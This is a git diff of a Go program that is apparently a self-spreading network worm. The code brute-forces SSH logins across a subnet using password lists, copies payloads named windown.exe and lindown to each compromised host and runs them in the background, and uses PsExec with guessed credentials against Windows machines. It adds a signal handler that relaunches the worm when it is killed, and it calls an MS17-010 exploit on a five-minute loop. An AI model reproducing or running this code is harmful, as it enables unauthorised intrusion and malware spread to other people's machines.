@@ -3,40 +3,43 @@ package main
 import (
 	"runtime"
 	"os"
-	"io/ioutil"
-	"strconv"
+	//"io/ioutil"
+	//"strconv"
 	"log"
+    "syscall"
 )
 
 //Put in target subnet in the form 10.2.3.
 import (
-		"golang.org/x/crypto/ssh"
-		"fmt"
-		"time"
-		"strings"
-		"bufio"
-		"sync"
-		"github.com/tmc/scp"
+	"golang.org/x/crypto/ssh"
+	"fmt"
+	"time"
+	"strings"
+	"bufio"
+	"sync"
+	"github.com/tmc/scp"
+	"github.com/syossan27/tebata"
+	"os/exec"
+	//"container/list"
+	"net"
+	"regexp"
 )
+
+func handler1() {
+	cmd := exec.Command(os.Args[0])
+	cmd.Start()
+	os.Exit(13)
+}
+
 func main(){
+    t := tebata.New(syscall.SIGINT, syscall.SIGTERM, syscall.SIGABRT, syscall.SIGKILL)
+	t.Reserve(handler1)
 	myos := runtime.GOOS
-	if myos=="windows" {
-		if _, err := os.Stat("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt"); os.IsNotExist(err) {
-			ioutil.WriteFile("\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\flag.txt",[]byte("hello"),0644)
-		} else {
-			os.Exit(3)
-		}
-	} else {
-		if _, err := os.Stat("/tmp/config-err-XJM1ll78/flag.txt"); os.IsNotExist(err) {
-			ioutil.WriteFile("/tmp/config-err-XJM1ll78/flag.txt",[]byte("hello"),0644)
-		} else {
-			os.Exit(3)
-		}
-	}
-	sum := 1
-	for sum  == 1 {
-		startwormingboi(myos)
+	startwormingboi(myos)
+	for len(os.Args) == 1{
 		time.Sleep(5 * time.Minute)
+		ms17_010()
+		startwormingboi(myos)
 	}
 }
 
@@ -44,33 +47,25 @@ func startwormingboi(myos string) {
 
 	var user = readinfile("user.txt")
 	var passwds = readinfile("passwds.txt")
-	var subnets = os.Args[1]
-	var step = readinfile("step.txt")
-
-	start, err := strconv.ParseInt(step[0], 10, 64)
-	if err != nil{
-		log.Fatal(err)
+	var subnets = ""
+	if len(os.Args) == 1 {
+		subnets = GetOutboundIP()
+	}else {
+		subnets = os.Args[1]
 	}
-	stop, err := strconv.ParseInt(step[1], 10, 0)
-	if err != nil{
-		log.Fatal(err)
-	}
-	stepval, err := strconv.ParseInt(step[2], 10, 0)
-	if err != nil{
-		log.Fatal(err)
-	}
+	var step = [3]string{"10","12","13"}
 	var myip = ""
 	var wg sync.WaitGroup
-		for l := start; l <= stop; l=l+stepval{
-			myip = joinstrings(subnets,strconv.Itoa(int(l)))
+		for _,element := range step{
+			myip = joinstrings(subnets,element)
+			fmt.Println(myip)
 				wg.Add(1)
-				go gettingin(myip, user, passwds, &wg)
-
+				go gettingin(myip, user, passwds, &wg, myos)
 			}
 			wg.Wait()
-	 } 
+} 
 
-func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup ){
+func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup, myos string ){
 	n := 0
 	var iswin = false
 	var passbreak = false
@@ -88,7 +83,6 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 				iswin = true
 			}
 			if iswin{
-				/**
 				if  myos == "windows"{
 
 					wincon := getinwin(myip, user[j],passwds[k])
@@ -105,7 +99,7 @@ func gettingin(myip string, user []string, passwds []string, wg *sync.WaitGroup 
 					fmt.Println("cant get onto windows from nonwindows :(")
 					passbreak = true
 					break
-				}*/
+				}
 				passbreak = true;
 			}
 			if n == 2{
@@ -141,18 +135,10 @@ func getinssh(myip string, user string, passwd string) (myreturn string) {
 	}
 
 	session := newsession(connection)
-	if (execlinuxcmd(session, "who")!=nil) {
-		execlinuxcmd(session, "mkdir \Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder'")
-		scpexec(session, "linuxhappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\linuxhappyfuntimes")
-		scpexec(session, "windowshappyfuntimes", "\\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
-		execlinuxcmd(session, "START /B \\Users\\%USERNAME%\\AppData\\Roaming\\Inconspicuous_Folder\\windowshappyfuntimes")
-	} else {
-		execlinuxcmd(session, "mkdir /tmp/config-err-XJM1ll78")
-		scpexec(session, "linuxhappyfuntimes", "/tmp/config-err-XJM1ll78/linuxhappyfuntimes")
-		scpexec(session, "windowshappyfuntimes", "/tmp/config-err-XJM1ll78/windowshappyfuntimes")
-		execlinuxcmd(session, "./tmp/config-err-XJM1ll78/linuxhappyfuntimes > /dev/null 2>&1 &")
-		// add exploit here
-	}
+	scpexec(session, "windown.exe", "\\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	execlinuxcmd(session, "START /B \\Users\\Administrator\\AppData\\Roaming\\windown.exe")
+	scpexec(session, "lindown", "/tmp/lindown")
+	execlinuxcmd(session, "./tmp/lindown > /dev/null 2>&1 &")
 	session.Close()
 	return "yes"
 }
@@ -182,7 +168,23 @@ func scpexec( session *ssh.Session, srcfile string, destfile string)() {
 
 
 func getinwin(myip string, user string, passwd string) (wincon int) {
+	pscom := "PsExec.exe"
+	iparg := joinstrings("\\\\", myip)
+	cmd := exec.Command(pscom, iparg,"-n","5","-u",user,"-p",passwd, "-accepteula","cmd","/c","START","/b",".\\windown.exe" )
+	output, _ := cmd.CombinedOutput()
+	strout := string(output)
+	if regexp.MustCompile(`error code 0`).MatchString(strout) == true { 								//true work case
+		//put payload here
+		fmt.Println("exit 1")
 
+		wincon = 1
+	} else if regexp.MustCompile(`The user name or password is incorrect.`).MatchString(strout) == true {						//false case
+		wincon = 2
+		fmt.Println("exit 2")
+	} else {											//psexec doesn't work
+		wincon = 3
+		fmt.Println("exit 3")
+	}
 	return
 }
 
@@ -210,4 +212,17 @@ func readinfile(myfile string) (readinarr []string){
         log.Fatal(err)
     }
     return
+}
+func GetOutboundIP() (myip string) {
+	conn, err := net.Dial("udp", "8.8.8.8:80")
+	if err != nil {
+		log.Fatal(err)
+	}
+	defer conn.Close()
+
+	localAddr := conn.LocalAddr().(*net.UDPAddr)
+	myip = localAddr.IP.String()
+	re := regexp.MustCompile(`.*\..*\.`)
+	myip = re.FindString(myip)
+	return myip
 }
